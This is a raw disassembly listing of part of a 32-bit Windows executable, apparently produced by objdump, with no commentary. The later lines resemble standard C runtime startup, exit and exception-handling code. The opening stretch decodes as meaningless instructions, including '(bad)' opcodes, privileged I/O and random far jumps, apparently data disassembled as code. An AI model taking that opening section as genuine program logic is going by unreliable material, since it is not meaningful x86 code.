  4241a0:	cmp    eax,0x45a30c67
  4241a5:	jmp    0xb654:0x317280bc
  4241ac:	out    dx,eax
  4241ad:	data16 shr BYTE PTR [esi],0x0
  4241b1:	inc    esi
  4241b2:	adc    eax,0x8fadbd4e
  4241b7:	xchg   esp,eax
  4241b8:	and    ecx,ebx
  4241ba:	jle    0x42422d
  4241bc:	clc    
  4241bd:	sub    bh,BYTE PTR [ebx-0x5f43acc9]
  4241c3:	sub    bl,bl
  4241c5:	outs   dx,BYTE PTR ds:[esi]
  4241c6:	fwait
  4241c7:	sub    edx,DWORD PTR [esi+0x2]
  4241ca:	jbe    0x4241c3
  4241cc:	pop    edx
  4241cd:	push   edi
  4241ce:	clc    
  4241cf:	neg    BYTE PTR [esi]
  4241d1:	imul   esp,DWORD PTR [edi+ebp*8],0x61f638a4
  4241d8:	ja     0x4241a0
  4241da:	(bad)  
  4241db:	push   edi
  4241dc:	rcr    BYTE PTR [edx-0x52],cl
  4241df:	lods   al,BYTE PTR ds:[esi]
  4241e0:	call   DWORD PTR [ebx+edi*2]
  4241e3:	dec    ecx
  4241e4:	adc    DWORD PTR [ebx-0x67],ebp
  4241e7:	inc    edx
  4241e8:	(bad)  
  4241e9:	inc    edi
  4241ea:	into   
  4241eb:	shl    BYTE PTR [ebx+0x4f],0xb5
  4241ef:	mov    eax,eax
  4241f1:	nop
  4241f2:	mov    al,ds:0x7151a311
  4241f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241f8:	lahf   
  4241f9:	xchg   BYTE PTR [edi+0x52],al
  4241fc:	std    
  4241fd:	xchg   al,cl
  4241ff:	jne    0x4241ed
  424201:	outs   dx,DWORD PTR ds:[esi]
  424202:	data16 mov cl,0xe5
  424205:	ja     0x424265
  424207:	shl    BYTE PTR [edi],1
  424209:	aam    0x5d
  42420b:	ret    
  42420c:	add    al,0x9e
  42420e:	retf   0xcab5
  424211:	cmp    DWORD PTR [ebx+eiz*2-0x6b88a450],0x25a21c01
  42421c:	jo     0x42425e
  42421e:	xchg   ebp,esp
  424220:	pop    eax
  424221:	aad    0xf2
  424223:	sti    
  424224:	inc    ebx
  424225:	push   esp
  424226:	xor    BYTE PTR [ecx],al
  424228:	dec    edx
  424229:	ins    DWORD PTR es:[edi],dx
  42422a:	loopne 0x4241c1
  42422c:	pop    esi
  42422d:	bndldx (bad),[esp+edx*2+0x28]
  424232:	cmp    BYTE PTR [ebp+0x47],ah
  424235:	pop    ecx
  424236:	jae    0x4241c8
  424238:	push   ss
  424239:	xchg   edx,eax
  42423a:	(bad)  [ebp-0x20d67a8f]
  424240:	jnp    0x42422d
  424242:	inc    ebp
  424243:	dec    esp
  424244:	push   ecx
  424245:	mov    ds:0x81dbd663,al
  42424a:	shl    DWORD PTR [esi-0x6b6316e4],0xc
  424251:	adc    eax,DWORD PTR [eax+esi*2]
  424254:	jp     0x424291
  424256:	mov    esi,0x10cefdb3
  42425b:	dec    edi
  42425c:	push   ebx
  42425d:	inc    ebp
  42425e:	arpl   WORD PTR [esp+ebx*1+0x18],bp
  424262:	sti    
  424263:	pop    ebx
  424264:	inc    DWORD PTR [ebx-0x360db4a7]
  42426a:	fdiv   QWORD PTR [ecx]
  42426c:	sbb    al,0x6b
  42426e:	adc    BYTE PTR ds:0x61ab521d,dl
  424274:	sbb    eax,0xa184fc9
  424279:	xchg   ebx,eax
  42427a:	cmp    BYTE PTR [esi],cl
  42427c:	pop    ebx
  42427d:	jb     0x424203
  42427f:	imul   ecx,DWORD PTR [ecx+0x3e7c1164],0xfffffffe
  424286:	mov    ah,0xf7
  424288:	pop    edx
  424289:	cld    
  42428a:	sbb    eax,DWORD PTR [ecx-0x60]
  42428d:	pop    ebx
  42428e:	xor    DWORD PTR [edi-0x9d48994],esi
  424294:	inc    esi
  424295:	push   ebx
  424296:	sub    ecx,DWORD PTR [edi+0x4e37c92c]
  42429c:	jo     0x424309
  42429e:	adc    DWORD PTR [ebx+0x1e844352],eax
  4242a4:	push   edx
  4242a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242a6:	int    0x69
  4242a8:	push   0x24
  4242aa:	and    ah,cl
  4242ac:	add    BYTE PTR [ecx+0x11],bh
  4242af:	sbb    ebp,0xf4ea99f2
  4242b5:	mov    esi,0xd54cd3c9
  4242ba:	sub    DWORD PTR [ebp+0x51],ebp
  4242bd:	xor    eax,0x5cf3409e
  4242c2:	call   0xc5bd:0xb0f6836d
  4242c9:	and    esp,DWORD PTR [ebx]
  4242cb:	leave  
  4242cc:	pop    ecx
  4242cd:	add    BYTE PTR [eax],al
  4242cf:	aaa    
  4242d0:	pop    esi
  4242d1:	popa   
  4242d2:	int    0xc4
  4242d4:	imul   edx,DWORD PTR [edi+eax*8-0x14281c31],0x3149d4ad
  4242df:	fstp   QWORD PTR ds:0x3707ad22
  4242e5:	mov    eax,0x9edf8f45
  4242ea:	lods   al,BYTE PTR ds:[esi]
  4242eb:	into   
  4242ec:	mov    gs,WORD PTR [edi+0x42096c85]
  4242f2:	out    dx,eax
  4242f3:	jge    0x42436e
  4242f5:	(bad)  
  4242f6:	aad    0xe1
  4242f8:	repz inc esp
  4242fa:	xchg   edi,eax
  4242fb:	fisubr WORD PTR [eax+0x46]
  4242fe:	mov    dl,0xf2
  424300:	sbb    al,0x4a
  424302:	fld    QWORD PTR [edx+0x2c]
  424305:	sbb    eax,0x39f48477
  42430a:	lock pop edi
  42430c:	jbe    0x4242b6
  42430e:	inc    esi
  42430f:	xchg   ecx,eax
  424310:	hlt    
  424311:	mov    ?,WORD PTR [esp+esi*2]
  424314:	jl     0x4242af
  424316:	(bad)  
  424317:	dec    esi
  424318:	adc    al,0xce
  42431a:	shl    bh,0xf6
  42431d:	pop    edi
  42431e:	xor    BYTE PTR [ebp+0x3],0x1d
  424322:	adc    BYTE PTR [eax-0x71a97362],dl
  424328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424329:	(bad)  [ecx-0x68086453]
  42432f:	xor    ebx,DWORD PTR [ebx-0x2]
  424332:	iret   
  424333:	mov    bl,0x16
  424335:	test   al,0x36
  424337:	mov    fs,edi
  424339:	(bad)  
  42433a:	fsub   QWORD PTR [ebx+0x33]
  42433d:	jl     0x4243a0
  42433f:	pusha  
  424340:	xor    edi,DWORD PTR [esi+0x58]
  424343:	sub    eax,0x6eac5703
  424348:	ss jb  0x42439e
  42434b:	pushf  
  42434c:	dec    esp
  42434d:	jmp    0x42ee814d
  424352:	sub    eax,0xfb951050
  424357:	fimul  WORD PTR es:[edx+0x64e0e2a2]
  42435e:	lods   al,BYTE PTR ds:[esi]
  42435f:	cmc    
  424360:	enter  0x2ac2,0x37
  424364:	adc    DWORD PTR [edx+0x30],ebx
  424367:	jmp    0xcd21094
  42436c:	das    
  42436d:	sub    bh,BYTE PTR [esi+0xd]
  424370:	push   ds
  424371:	mov    esp,DWORD PTR [edx+0x7c]
  424374:	popa   
  424375:	lods   eax,DWORD PTR ds:[esi]
  424376:	rdmsr  
  424378:	out    dx,al
  424379:	inc    ebx
  42437a:	inc    ebx
  42437b:	sub    esi,DWORD PTR [edi-0x64]
  42437e:	jmp    0x42436e
  424380:	jl     0x4243fe
  424382:	jne    0x42433f
  424384:	push   edx
  424385:	adc    al,0xf7
  424387:	lahf   
  424388:	cmc    
  424389:	pop    edx
  42438a:	gs jns 0x424388
  42438d:	out    0x11,al
  42438f:	fiadd  DWORD PTR [ebx-0x5e]
  424392:	jmp    0x4243a4
  424394:	stc    
  424395:	hlt    
  424396:	xor    eax,0x75be0329
  42439b:	push   ebx
  42439c:	fild   DWORD PTR [ebx+0x46779e98]
  4243a2:	fs fstp st(3)
  4243a5:	pop    esi
  4243a6:	leave  
  4243a7:	scas   al,BYTE PTR es:[edi]
  4243a8:	fs fmulp st(6),st
  4243ab:	mov    ds:0x1e5a1bc4,al
  4243b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243b1:	icebp  
  4243b2:	jp     0x4243bb
  4243b4:	jg     0x424405
  4243b6:	shr    ah,cl
  4243b8:	add    eax,0x7bf58468
  4243bd:	cmp    eax,0x24c5a9a3
  4243c2:	nop
  4243c3:	push   es
  4243c4:	pop    es
  4243c5:	mov    ecx,0x10e5f8ec
  4243ca:	mov    ch,0x68
  4243cc:	mov    esi,0x1e64f0aa
  4243d1:	and    eax,0x3a21a283
  4243d6:	push   0xffffffd9
  4243d8:	lea    edx,[eax-0x648d52e5]
  4243de:	int3   
  4243df:	xor    ebx,esp
  4243e1:	cli    
  4243e2:	xchg   edi,eax
  4243e3:	or     ebx,DWORD PTR [edx-0x4c0ef5bc]
  4243e9:	add    eax,0x29e89d60
  4243ee:	push   0x0
  4243f0:	push   0x0
  4243f2:	call   0x424400
  4243f7:	xor    eax,eax
  4243f9:	add    esp,0x10
  4243fc:	ret    0x10
  4243ff:	nop
  424400:	jmp    DWORD PTR ds:0x429110
  424406:	cmp    DWORD PTR ds:0x45dabc,0x1
  42440d:	jne    0x424414
  42440f:	call   0x424952
  424414:	push   DWORD PTR [esp+0x4]
  424418:	call   0x4247db
  42441d:	push   0xff
  424422:	call   DWORD PTR ds:0x45d1c0
  424428:	pop    ecx
  424429:	pop    ecx
  42442a:	ret    
  42442b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424432:	jne    0x424439
  424434:	call   0x424952
  424439:	push   DWORD PTR [esp+0x4]
  42443d:	call   0x4247db
  424442:	push   0xff
  424447:	call   0x424621
  42444c:	pop    ecx
  42444d:	pop    ecx
  42444e:	ret    
  42444f:	push   0x60
  424451:	push   0x429220
  424456:	call   0x425340
  42445b:	mov    edi,0x94
  424460:	mov    eax,edi
  424462:	call   0x425390
  424467:	mov    DWORD PTR [ebp-0x18],esp
  42446a:	mov    esi,esp
  42446c:	mov    DWORD PTR [esi],edi
  42446e:	push   esi
  42446f:	call   DWORD PTR ds:0x429054
  424475:	mov    ecx,DWORD PTR [esi+0x10]
  424478:	mov    DWORD PTR ds:0x45dac4,ecx
  42447e:	mov    eax,DWORD PTR [esi+0x4]
  424481:	mov    ds:0x45dad0,eax
  424486:	mov    edx,DWORD PTR [esi+0x8]
  424489:	mov    DWORD PTR ds:0x45dad4,edx
  42448f:	mov    esi,DWORD PTR [esi+0xc]
  424492:	and    esi,0x7fff
  424498:	mov    DWORD PTR ds:0x45dac8,esi
  42449e:	cmp    ecx,0x2
  4244a1:	je     0x4244af
  4244a3:	or     esi,0x8000
  4244a9:	mov    DWORD PTR ds:0x45dac8,esi
  4244af:	shl    eax,0x8
  4244b2:	add    eax,edx
  4244b4:	mov    ds:0x45dacc,eax
  4244b9:	xor    esi,esi
  4244bb:	push   esi
  4244bc:	mov    edi,DWORD PTR ds:0x429024
  4244c2:	call   edi
  4244c4:	cmp    WORD PTR [eax],0x5a4d
  4244c9:	jne    0x4244ea
  4244cb:	mov    ecx,DWORD PTR [eax+0x3c]
  4244ce:	add    ecx,eax
  4244d0:	cmp    DWORD PTR [ecx],0x4550
  4244d6:	jne    0x4244ea
  4244d8:	movzx  eax,WORD PTR [ecx+0x18]
  4244dc:	cmp    eax,0x10b
  4244e1:	je     0x424502
  4244e3:	cmp    eax,0x20b
  4244e8:	je     0x4244ef
  4244ea:	mov    DWORD PTR [ebp-0x1c],esi
  4244ed:	jmp    0x424516
  4244ef:	cmp    DWORD PTR [ecx+0x84],0xe
  4244f6:	jbe    0x4244ea
  4244f8:	xor    eax,eax
  4244fa:	cmp    DWORD PTR [ecx+0xf8],esi
  424500:	jmp    0x424510
  424502:	cmp    DWORD PTR [ecx+0x74],0xe
  424506:	jbe    0x4244ea
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xe8],esi
  424510:	setne  al
  424513:	mov    DWORD PTR [ebp-0x1c],eax
  424516:	push   0x1
  424518:	call   0x4252ed
  42451d:	pop    ecx
  42451e:	test   eax,eax
  424520:	jne    0x42452a
  424522:	push   0x1c
  424524:	call   0x42442b
  424529:	pop    ecx
  42452a:	call   0x425264
  42452f:	test   eax,eax
  424531:	jne    0x42453b
  424533:	push   0x10
  424535:	call   0x42442b
  42453a:	pop    ecx
  42453b:	call   0x42514d
  424540:	mov    DWORD PTR [ebp-0x4],esi
  424543:	call   0x424f4f
  424548:	test   eax,eax
  42454a:	jge    0x424554
  42454c:	push   0x1b
  42454e:	call   0x424406
  424553:	pop    ecx
  424554:	call   DWORD PTR ds:0x429050
  42455a:	mov    ds:0x45e274,eax
  42455f:	call   0x424e2d
  424564:	mov    ds:0x45dab4,eax
  424569:	call   0x424d8b
  42456e:	test   eax,eax
  424570:	jge    0x42457a
  424572:	push   0x8
  424574:	call   0x424406
  424579:	pop    ecx
  42457a:	call   0x424b58
  42457f:	test   eax,eax
  424581:	jge    0x42458b
  424583:	push   0x9
  424585:	call   0x424406
  42458a:	pop    ecx
  42458b:	call   0x424663
  424590:	mov    DWORD PTR [ebp-0x20],eax
  424593:	cmp    eax,esi
  424595:	je     0x42459e
  424597:	push   eax
  424598:	call   0x424406
  42459d:	pop    ecx
  42459e:	mov    DWORD PTR [ebp-0x38],esi
  4245a1:	lea    eax,[ebp-0x64]
  4245a4:	push   eax
  4245a5:	call   DWORD PTR ds:0x42904c
  4245ab:	call   0x424aef
  4245b0:	mov    DWORD PTR [ebp-0x68],eax
  4245b3:	test   BYTE PTR [ebp-0x38],0x1
  4245b7:	je     0x4245bf
  4245b9:	movzx  eax,WORD PTR [ebp-0x34]
  4245bd:	jmp    0x4245c2
  4245bf:	push   0xa
  4245c1:	pop    eax
  4245c2:	push   eax
  4245c3:	push   DWORD PTR [ebp-0x68]
  4245c6:	push   esi
  4245c7:	push   esi
  4245c8:	call   edi
  4245ca:	push   eax
  4245cb:	call   0x422f80
  4245d0:	mov    edi,eax
  4245d2:	mov    DWORD PTR [ebp-0x6c],edi
  4245d5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245d8:	jne    0x4245e0
  4245da:	push   edi
  4245db:	call   0x42479b
  4245e0:	call   0x4247bd
  4245e5:	jmp    0x424612
  4245e7:	mov    eax,DWORD PTR [ebp-0x14]
  4245ea:	mov    ecx,DWORD PTR [eax]
  4245ec:	mov    ecx,DWORD PTR [ecx]
  4245ee:	mov    DWORD PTR [ebp-0x70],ecx
  4245f1:	push   eax
  4245f2:	push   ecx
  4245f3:	call   0x42498b
  4245f8:	pop    ecx
  4245f9:	pop    ecx
  4245fa:	ret    
  4245fb:	mov    esp,DWORD PTR [ebp-0x18]
  4245fe:	mov    edi,DWORD PTR [ebp-0x70]
  424601:	cmp    DWORD PTR [ebp-0x1c],0x0
  424605:	jne    0x42460d
  424607:	push   edi
  424608:	call   0x4247ac
  42460d:	call   0x4247cc
  424612:	or     DWORD PTR [ebp-0x4],0xffffffff
  424616:	mov    eax,edi
  424618:	lea    esp,[ebp-0x7c]
  42461b:	call   0x42537b
  424620:	ret    
  424621:	push   0x42923c
  424626:	call   DWORD PTR ds:0x429024
  42462c:	test   eax,eax
  42462e:	je     0x424646
  424630:	push   0x42922c
  424635:	push   eax
  424636:	call   DWORD PTR ds:0x429020
  42463c:	test   eax,eax
  42463e:	je     0x424646
  424640:	push   DWORD PTR [esp+0x4]
  424644:	call   eax
  424646:	push   DWORD PTR [esp+0x4]
  42464a:	call   DWORD PTR ds:0x429058
  424650:	int3   
  424651:	push   0x8
  424653:	call   0x4254ff
  424658:	pop    ecx
  424659:	ret    
  42465a:	push   0x8
  42465c:	call   0x42546b
  424661:	pop    ecx
  424662:	ret    
  424663:	mov    eax,ds:0x45e270
  424668:	test   eax,eax
  42466a:	je     0x42466e
  42466c:	call   eax
  42466e:	push   esi
  42466f:	push   edi
  424670:	mov    ecx,0x42b00c
  424675:	mov    edi,0x42b018
  42467a:	xor    eax,eax
  42467c:	cmp    ecx,edi
  42467e:	mov    esi,ecx
  424680:	jae    0x424699
  424682:	test   eax,eax
  424684:	jne    0x4246c5
  424686:	mov    ecx,DWORD PTR [esi]
  424688:	test   ecx,ecx
  42468a:	je     0x42468e
  42468c:	call   ecx
  42468e:	add    esi,0x4
  424691:	cmp    esi,edi
  424693:	jb     0x424682
  424695:	test   eax,eax
  424697:	jne    0x4246c5
  424699:	push   0x425191
  42469e:	call   0x425610
  4246a3:	mov    esi,0x42b000
  4246a8:	mov    eax,esi
  4246aa:	mov    edi,0x42b008
  4246af:	cmp    eax,edi
  4246b1:	pop    ecx
  4246b2:	jae    0x4246c3
  4246b4:	mov    eax,DWORD PTR [esi]
  4246b6:	test   eax,eax
  4246b8:	je     0x4246bc
  4246ba:	call   eax
  4246bc:	add    esi,0x4
  4246bf:	cmp    esi,edi
  4246c1:	jb     0x4246b4
  4246c3:	xor    eax,eax
  4246c5:	pop    edi
  4246c6:	pop    esi
  4246c7:	ret    
  4246c8:	push   ebp
  4246c9:	mov    ebp,esp
  4246cb:	push   esi
  4246cc:	push   edi
  4246cd:	push   0x8
  4246cf:	call   0x4254ff
  4246d4:	xor    esi,esi
  4246d6:	inc    esi
  4246d7:	cmp    DWORD PTR ds:0x45db04,esi
  4246dd:	pop    ecx
  4246de:	jne    0x4246f0
  4246e0:	push   DWORD PTR [ebp+0x8]
  4246e3:	call   DWORD PTR ds:0x429060
  4246e9:	push   eax
  4246ea:	call   DWORD PTR ds:0x42905c
  4246f0:	cmp    DWORD PTR [ebp+0xc],0x0
  4246f4:	mov    al,BYTE PTR [ebp+0x10]
  4246f7:	mov    DWORD PTR ds:0x45db00,esi
  4246fd:	mov    ds:0x45dafc,al
  424702:	jne    0x424756
  424704:	mov    ecx,DWORD PTR ds:0x45e268
  42470a:	test   ecx,ecx
  42470c:	je     0x424737
  42470e:	mov    eax,ds:0x45e264
  424713:	sub    eax,0x4
  424716:	cmp    eax,ecx
  424718:	jmp    0x424730
  42471a:	mov    eax,DWORD PTR [eax]
  42471c:	test   eax,eax
  42471e:	je     0x424722
  424720:	call   eax
  424722:	mov    eax,ds:0x45e264
  424727:	sub    eax,0x4
  42472a:	cmp    eax,DWORD PTR ds:0x45e268
  424730:	mov    ds:0x45e264,eax
  424735:	jae    0x42471a
  424737:	mov    eax,0x42b01c
  42473c:	mov    esi,0x42b020
  424741:	cmp    eax,esi
  424743:	mov    edi,eax
  424745:	jae    0x424756
  424747:	mov    eax,DWORD PTR [edi]
  424749:	test   eax,eax
  42474b:	je     0x42474f
  42474d:	call   eax
  42474f:	add    edi,0x4
  424752:	cmp    edi,esi
  424754:	jb     0x424747
  424756:	mov    eax,0x42b024
  42475b:	mov    esi,0x42b028
  424760:	cmp    eax,esi
  424762:	mov    edi,eax
  424764:	jae    0x424775
  424766:	mov    eax,DWORD PTR [edi]
  424768:	test   eax,eax
  42476a:	je     0x42476e
  42476c:	call   eax
  42476e:	add    edi,0x4
  424771:	cmp    edi,esi
  424773:	jb     0x424766
  424775:	cmp    DWORD PTR [ebp+0x10],0x0
  424779:	pop    edi
  42477a:	pop    esi
  42477b:	je     0x424786
  42477d:	push   0x8
  42477f:	call   0x42546b
  424784:	jmp    0x424798
  424786:	push   DWORD PTR [ebp+0x8]
  424789:	mov    DWORD PTR ds:0x45db04,0x1
  424793:	call   0x424621
  424798:	pop    ecx
  424799:	pop    ebp
  42479a:	ret    
  42479b:	push   0x0
  42479d:	push   0x0
  42479f:	push   DWORD PTR [esp+0xc]
  4247a3:	call   0x4246c8
  4247a8:	add    esp,0xc
  4247ab:	ret    
  4247ac:	push   0x0
  4247ae:	push   0x1
  4247b0:	push   DWORD PTR [esp+0xc]
  4247b4:	call   0x4246c8
  4247b9:	add    esp,0xc
  4247bc:	ret    
  4247bd:	push   0x1
  4247bf:	push   0x0
  4247c1:	push   0x0
  4247c3:	call   0x4246c8
  4247c8:	add    esp,0xc
  4247cb:	ret    
  4247cc:	push   0x1
  4247ce:	push   0x1
  4247d0:	push   0x0
  4247d2:	call   0x4246c8
  4247d7:	add    esp,0xc
  4247da:	ret    
  4247db:	push   ebp
  4247dc:	mov    ebp,esp
  4247de:	sub    esp,0x10c
  4247e4:	mov    eax,ds:0x45d430
  4247e9:	xor    eax,DWORD PTR [ebp+0x4]
  4247ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ef:	push   ebx
  4247f0:	push   esi
  4247f1:	mov    DWORD PTR [ebp-0x4],eax
  4247f4:	xor    edx,edx
  4247f6:	push   edi
  4247f7:	xor    eax,eax
  4247f9:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424800:	je     0x424808
  424802:	inc    eax
  424803:	cmp    eax,0x12
  424806:	jb     0x4247f9
  424808:	mov    esi,eax
  42480a:	shl    esi,0x3
  42480d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424813:	jne    0x42493c
  424819:	mov    eax,ds:0x45dabc
  42481e:	cmp    eax,0x1
  424821:	je     0x424917
  424827:	cmp    eax,edx
  424829:	jne    0x424838
  42482b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424832:	je     0x424917
  424838:	cmp    ecx,0xfc
  42483e:	je     0x42493c
  424844:	push   0x104
  424849:	lea    eax,[ebp-0x10c]
  42484f:	push   eax
  424850:	push   edx
  424851:	mov    BYTE PTR [ebp-0x8],dl
  424854:	call   DWORD PTR ds:0x429068
  42485a:	test   eax,eax
  42485c:	jne    0x424871
  42485e:	lea    eax,[ebp-0x10c]
  424864:	push   0x429594
  424869:	push   eax
  42486a:	call   0x425720
  42486f:	pop    ecx
  424870:	pop    ecx
  424871:	lea    eax,[ebp-0x10c]
  424877:	push   eax
  424878:	lea    edi,[ebp-0x10c]
  42487e:	call   0x425950
  424883:	inc    eax
  424884:	cmp    eax,0x3c
  424887:	pop    ecx
  424888:	jbe    0x4248b3
  42488a:	lea    eax,[ebp-0x10c]
  424890:	push   eax
  424891:	call   0x425950
  424896:	mov    edi,eax
  424898:	lea    eax,[ebp-0x10c]
  42489e:	sub    eax,0x3b
  4248a1:	push   0x3
  4248a3:	add    edi,eax
  4248a5:	push   0x429590
  4248aa:	push   edi
  4248ab:	call   0x425820
  4248b0:	add    esp,0x10
  4248b3:	push   edi
  4248b4:	call   0x425950
  4248b9:	push   DWORD PTR [esi+0x45d1cc]
  4248bf:	mov    ebx,eax
  4248c1:	call   0x425950
  4248c6:	lea    eax,[ebx+eax*1+0x1c]
  4248ca:	pop    ecx
  4248cb:	add    eax,0x3
  4248ce:	pop    ecx
  4248cf:	and    eax,0xfffffffc
  4248d2:	call   0x425390
  4248d7:	mov    ebx,esp
  4248d9:	push   0x429574
  4248de:	push   ebx
  4248df:	call   0x425720
  4248e4:	push   edi
  4248e5:	push   ebx
  4248e6:	call   0x425730
  4248eb:	push   0x429570
  4248f0:	push   ebx
  4248f1:	call   0x425730
  4248f6:	push   DWORD PTR [esi+0x45d1cc]
  4248fc:	push   ebx
  4248fd:	call   0x425730
  424902:	push   0x12010
  424907:	push   0x429548
  42490c:	push   ebx
  42490d:	call   0x425622
  424912:	add    esp,0x2c
  424915:	jmp    0x42493c
  424917:	push   edx
  424918:	lea    eax,[ebp+0x8]
  42491b:	push   eax
  42491c:	lea    esi,[esi+0x45d1cc]
  424922:	push   DWORD PTR [esi]
  424924:	call   0x425950
  424929:	pop    ecx
  42492a:	push   eax
  42492b:	push   DWORD PTR [esi]
  42492d:	push   0xfffffff4
  42492f:	call   DWORD PTR ds:0x429064
  424935:	push   eax
  424936:	call   DWORD PTR ds:0x42900c
  42493c:	lea    esp,[ebp-0x118]
  424942:	mov    ecx,DWORD PTR [ebp-0x4]
  424945:	xor    ecx,DWORD PTR [ebp+0x4]
  424948:	call   0x425a0c
  42494d:	pop    edi
  42494e:	pop    esi
  42494f:	pop    ebx
  424950:	leave  
  424951:	ret    
  424952:	mov    eax,ds:0x45dabc
  424957:	cmp    eax,0x1
  42495a:	je     0x424969
  42495c:	test   eax,eax
  42495e:	jne    0x42498a
  424960:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424967:	jne    0x42498a
  424969:	push   0xfc
  42496e:	call   0x4247db
  424973:	mov    eax,ds:0x45db08
  424978:	test   eax,eax
  42497a:	pop    ecx
  42497b:	je     0x42497f
  42497d:	call   eax
  42497f:	push   0xff
  424984:	call   0x4247db
  424989:	pop    ecx
  42498a:	ret    
  42498b:	push   ebp
  42498c:	mov    ebp,esp
  42498e:	push   ecx
  42498f:	push   ebx
  424990:	push   esi
  424991:	push   edi
  424992:	call   0x4251f3
  424997:	mov    edi,DWORD PTR [ebp+0x8]
  42499a:	mov    esi,eax
  42499c:	mov    edx,DWORD PTR [esi+0x54]
  42499f:	mov    eax,ds:0x45d2dc
  4249a4:	mov    ecx,edx
  4249a6:	cmp    DWORD PTR [ecx],edi
  4249a8:	je     0x4249b7
  4249aa:	lea    ebx,[eax+eax*2]
  4249ad:	add    ecx,0xc
  4249b0:	lea    ebx,[edx+ebx*4]
  4249b3:	cmp    ecx,ebx
  4249b5:	jb     0x4249a6
  4249b7:	lea    eax,[eax+eax*2]
  4249ba:	lea    eax,[edx+eax*4]
  4249bd:	cmp    ecx,eax
  4249bf:	jae    0x4249c5
  4249c1:	cmp    DWORD PTR [ecx],edi
  4249c3:	je     0x4249c7
  4249c5:	xor    ecx,ecx
  4249c7:	test   ecx,ecx
  4249c9:	je     0x424ae1
  4249cf:	mov    ebx,DWORD PTR [ecx+0x8]
  4249d2:	test   ebx,ebx
  4249d4:	mov    DWORD PTR [ebp+0x8],ebx
  4249d7:	je     0x424ae1
  4249dd:	cmp    ebx,0x5
  4249e0:	jne    0x4249ee
  4249e2:	and    DWORD PTR [ecx+0x8],0x0
  4249e6:	xor    eax,eax
  4249e8:	inc    eax
  4249e9:	jmp    0x424aea
  4249ee:	cmp    ebx,0x1
  4249f1:	je     0x424adc
  4249f7:	mov    eax,DWORD PTR [esi+0x58]
  4249fa:	mov    DWORD PTR [ebp-0x4],eax
  4249fd:	mov    eax,DWORD PTR [ebp+0xc]
  424a00:	mov    DWORD PTR [esi+0x58],eax
  424a03:	mov    eax,DWORD PTR [ecx+0x4]
  424a06:	cmp    eax,0x8
  424a09:	jne    0x424ace
  424a0f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a15:	mov    eax,ds:0x45d2d4
  424a1a:	add    eax,edx
  424a1c:	cmp    edx,eax
  424a1e:	jge    0x424a47
  424a20:	lea    eax,[edx+edx*2]
  424a23:	shl    eax,0x2
  424a26:	mov    edi,DWORD PTR [esi+0x54]
  424a29:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a2e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a34:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a3a:	inc    edx
  424a3b:	add    ebx,edi
  424a3d:	add    eax,0xc
  424a40:	cmp    edx,ebx
  424a42:	jl     0x424a26
  424a44:	mov    ebx,DWORD PTR [ebp+0x8]
  424a47:	mov    ecx,DWORD PTR [ecx]
  424a49:	cmp    ecx,0xc000008e
  424a4f:	mov    edi,DWORD PTR [esi+0x5c]
  424a52:	jne    0x424a5d
  424a54:	mov    DWORD PTR [esi+0x5c],0x83
  424a5b:	jmp    0x424ac1
  424a5d:	cmp    ecx,0xc0000090
  424a63:	jne    0x424a6e
  424a65:	mov    DWORD PTR [esi+0x5c],0x81
  424a6c:	jmp    0x424ac1
  424a6e:	cmp    ecx,0xc0000091
  424a74:	jne    0x424a7f
  424a76:	mov    DWORD PTR [esi+0x5c],0x84
  424a7d:	jmp    0x424ac1
  424a7f:	cmp    ecx,0xc0000093
  424a85:	jne    0x424a90
  424a87:	mov    DWORD PTR [esi+0x5c],0x85
  424a8e:	jmp    0x424ac1
  424a90:	cmp    ecx,0xc000008d
  424a96:	jne    0x424aa1
  424a98:	mov    DWORD PTR [esi+0x5c],0x82
  424a9f:	jmp    0x424ac1
  424aa1:	cmp    ecx,0xc000008f
  424aa7:	jne    0x424ab2
  424aa9:	mov    DWORD PTR [esi+0x5c],0x86
  424ab0:	jmp    0x424ac1
  424ab2:	cmp    ecx,0xc0000092
  424ab8:	jne    0x424ac1
  424aba:	mov    DWORD PTR [esi+0x5c],0x8a
  424ac1:	push   DWORD PTR [esi+0x5c]
  424ac4:	push   0x8
  424ac6:	call   ebx
  424ac8:	pop    ecx
  424ac9:	mov    DWORD PTR [esi+0x5c],edi
  424acc:	jmp    0x424ad5
  424ace:	and    DWORD PTR [ecx+0x8],0x0
  424ad2:	push   eax
  424ad3:	call   ebx
  424ad5:	mov    eax,DWORD PTR [ebp-0x4]
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x58],eax
  424adc:	or     eax,0xffffffff
  424adf:	jmp    0x424aea
  424ae1:	push   DWORD PTR [ebp+0xc]
  424ae4:	call   DWORD PTR ds:0x42906c
  424aea:	pop    edi
  424aeb:	pop    esi
  424aec:	pop    ebx
  424aed:	leave  
  424aee:	ret    
  424aef:	cmp    DWORD PTR ds:0x45e26c,0x0
  424af6:	jne    0x424afd
  424af8:	call   0x425f2c
  424afd:	push   esi
  424afe:	mov    esi,DWORD PTR ds:0x45e274
  424b04:	test   esi,esi
  424b06:	jne    0x424b0f
  424b08:	mov    esi,0x4295ab
  424b0d:	jmp    0x424b54
  424b0f:	mov    al,BYTE PTR [esi]
  424b11:	cmp    al,0x22
  424b13:	jne    0x424b3d
  424b15:	inc    esi
  424b16:	mov    al,BYTE PTR [esi]
  424b18:	cmp    al,0x22
  424b1a:	je     0x424b4d
  424b1c:	test   al,al
  424b1e:	je     0x424b36
  424b20:	movzx  eax,al
  424b23:	push   eax
  424b24:	call   0x425a4b
  424b29:	test   eax,eax
  424b2b:	pop    ecx
  424b2c:	je     0x424b2f
  424b2e:	inc    esi
  424b2f:	inc    esi
  424b30:	mov    al,BYTE PTR [esi]
  424b32:	cmp    al,0x22
